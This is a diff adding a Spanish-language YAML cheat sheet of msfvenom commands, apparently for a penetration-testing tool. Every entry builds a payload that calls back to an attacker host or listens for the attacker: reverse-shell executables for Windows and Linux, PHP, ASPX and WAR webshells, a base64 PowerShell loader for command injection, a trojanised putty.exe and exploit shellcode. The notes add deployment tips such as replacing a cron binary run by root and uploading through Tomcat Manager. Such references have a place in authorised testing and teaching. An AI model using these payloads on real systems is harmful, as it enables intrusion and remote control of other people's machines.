@@ -1,0 +1,125 @@
+# Comandos de msfvenom: payloads sueltos (ejecutables, webshells, shellcode) para un handler o netcat.
+tool: msfvenom
+area: metasploit
+url: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
+commands:
+  - id: msfvenom-list-payloads
+    title: Listar payloads y formatos de msfvenom
+    cmd: |
+      msfvenom -l payloads | grep 'windows/x64/'
+    phase: initial-access
+    tags: [payloads]
+    notes: >-
+      Con -l formats salen los formatos de salida (exe, elf, raw, asp, aspx, war, psh...) y con
+      -p payload --list-options, las opciones de un payload concreto.
+
+  - id: msfvenom-windows-exe
+    title: Ejecutable de Windows con meterpreter
+    cmd: |
+      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe
+    phase: initial-access
+    tags: [payloads, reverse-shell]
+    notes: >-
+      Payload por etapas (la barra antes de reverse_tcp): necesita un multi/handler con el mismo
+      PAYLOAD, no vale netcat. Para un Windows de 32 bits, quita x64/.
+
+  - id: msfvenom-windows-shell-exe
+    title: Ejecutable de Windows con una shell para netcat
+    cmd: |
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe
+    phase: initial-access
+    tags: [payloads, reverse-shell]
+    notes: >-
+      Sin etapas (guion bajo en shell_reverse_tcp): manda cmd.exe entero, así que lo recoge un simple
+      nc -lvnp LPORT. Útil cuando no quieres o no puedes usar Metasploit.
+
+  - id: msfvenom-linux-elf
+    title: Ejecutable de Linux con meterpreter
+    cmd: |
+      msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf
+    phase: initial-access
+    tags: [payloads, reverse-shell]
+    notes: >-
+      En el objetivo necesita permiso de ejecución: chmod +x shell.elf y ./shell.elf, mejor desde /tmp
+      o /dev/shm. Recógelo con un multi/handler con el mismo PAYLOAD.
+
+  - id: msfvenom-linux-shell-elf
+    title: Ejecutable de Linux con una shell para netcat
+    cmd: |
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf
+    phase: initial-access
+    tags: [payloads, reverse-shell]
+    notes: >-
+      Sin etapas: lo recoge nc -lvnp LPORT. Sirve, por ejemplo, para reemplazar un script o binario
+      que root ejecuta desde cron.
+
+  - id: msfvenom-php
+    title: Webshell PHP con meterpreter
+    cmd: |
+      msfvenom -p php/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f raw -o shell.php
+    phase: initial-access
+    tags: [payloads, webshell, php]
+    notes: >-
+      Se sube donde el servidor ejecute PHP y se abre en el navegador o con curl. La sesión es un
+      meterpreter de PHP: sin migrate, getsystem ni hashdump. Para más, sube un ELF desde ella.
+
+  - id: msfvenom-aspx
+    title: Webshell ASPX con meterpreter para IIS
+    cmd: |
+      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f aspx -o shell.aspx
+    phase: initial-access
+    tags: [payloads, webshell, iis]
+    notes: >-
+      Para IIS con ASP.NET. Si el servidor solo ejecuta ASP clásico, usa -f asp y la extensión .asp.
+      El proceso de IIS (w3wp.exe) suele ser de 64 bits: payload x64.
+
+  - id: msfvenom-war
+    title: WAR con una shell para Tomcat
+    cmd: |
+      msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war -o shell.war
+    phase: initial-access
+    tags: [payloads, webshell, tomcat]
+    notes: >-
+      Se despliega desde el Tomcat Manager (/manager/html) con credenciales y se abre en /shell/. Da
+      una shell simple que recoge nc -lvnp LPORT.
+
+  - id: msfvenom-psh-cmd
+    title: Comando de PowerShell que carga meterpreter
+    cmd: |
+      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f psh-cmd
+    phase: initial-access
+    tags: [payloads, powershell]
+    notes: >-
+      Imprime una línea powershell.exe -e con el payload en base64: para una inyección de comandos en
+      Windows, donde no puedes subir un ejecutable.
+
+  - id: msfvenom-bind-exe
+    title: Ejecutable de Windows con un bind shell
+    cmd: |
+      msfvenom -p windows/x64/meterpreter/bind_tcp LPORT={{LPORT}} -f exe -o bind.exe
+    phase: lateral
+    tags: [payloads, bind-shell, pivoting]
+    notes: >-
+      Escucha en el objetivo y eres tú quien conecta: en el handler, RHOST en vez de LHOST. Es la
+      opción para un equipo detrás de un pivot, que no tiene ruta de vuelta hasta tu máquina.
+
+  - id: msfvenom-template-exe
+    title: Payload dentro de un ejecutable legítimo
+    cmd: |
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -x putty.exe -k -e x86/shikata_ga_nai -i 10 -f exe -o putty-mod.exe
+    phase: initial-access
+    tags: [payloads, client-side]
+    notes: >-
+      -x usa el programa como plantilla y -k lo mantiene funcionando con el payload en otro hilo
+      (mejor con plantillas de 32 bits). El encoder cambia los bytes, pero no engaña a un antivirus
+      actual: es para entender la técnica, no para evadir.
+
+  - id: msfvenom-shellcode
+    title: Shellcode para un exploit sin bytes prohibidos
+    cmd: |
+      msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v shellcode
+    phase: initial-access
+    tags: [payloads, shellcode]
+    notes: >-
+      Para pegar en un exploit de Exploit-DB que trae un shellcode de otra IP. -b quita los bytes que
+      rompen el exploit (los dice el propio exploit) y -f elige el lenguaje: python, c, ps1...
